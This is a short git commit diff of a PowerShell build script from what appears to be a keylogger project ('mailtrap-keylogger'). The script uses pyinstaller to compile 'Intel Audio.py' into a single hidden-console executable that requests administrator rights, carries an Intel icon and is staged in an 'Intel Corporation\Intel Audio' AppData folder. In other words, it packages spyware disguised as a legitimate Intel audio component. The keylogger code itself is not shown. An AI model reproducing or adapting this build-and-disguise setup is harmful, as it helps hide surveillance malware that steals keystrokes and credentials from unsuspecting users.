74e371b8d883f127da2c4a6c06d64146e800de30
B95segal <193628847+B95segal@users.noreply.github.com>
2025-01-10 07:33:37 +1100

    recompile

--- build.ps1
+++ build.ps1
@@ -1,12 +1,7 @@
-$venvScript  = "$ProjectPath\env\bin\activate.ps1"
 $ProjectPath = "$env:USERPROFILE\hack\mailtrap-keylogger\dist"
 $ProjectFile = "$ProjectPath\Intel Audio.exe"
 $ProjectZip  = "$ProjectPath\Intel Audio.zip"
-
 $DistPath    = "$env:USERPROFILE\AppData\Intel Corporation\Intel Audio"
-$DistFile    = "$DistPath\Intel Audio.exe"
-$DistZip     = "$DistPath\Intel Audio.zip"
-
 
 pyinstaller --clean --onefile --nowindowed --noconsole --hide-console hide-early -i .\icon.ico --uac-admin --disable-windowed-traceback --runtime-tmpdir $DistPath '.\Intel Audio.py'
 if (-Not (Test-Path $ProjectZip)) {`
